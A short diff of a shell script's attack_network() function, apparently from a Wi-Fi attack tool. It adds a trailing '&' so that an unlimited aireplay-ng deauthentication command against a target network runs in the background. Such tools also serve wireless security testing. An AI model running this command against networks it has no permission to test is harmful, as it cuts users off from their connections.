@@ -294,7 +294,7 @@ attack_network()
 
 		#attack a specific network
 		echo "			[+] Attacking $essid"
-		sudo aireplay-ng -0 0 -e $target_network $mon_mode --ignore-negative-one > /dev/null 2>&1
+		sudo aireplay-ng -0 0 -e $target_network $mon_mode --ignore-negative-one > /dev/null 2>&1 &
 	fi
 	
 	#Stopping the attack on user's will
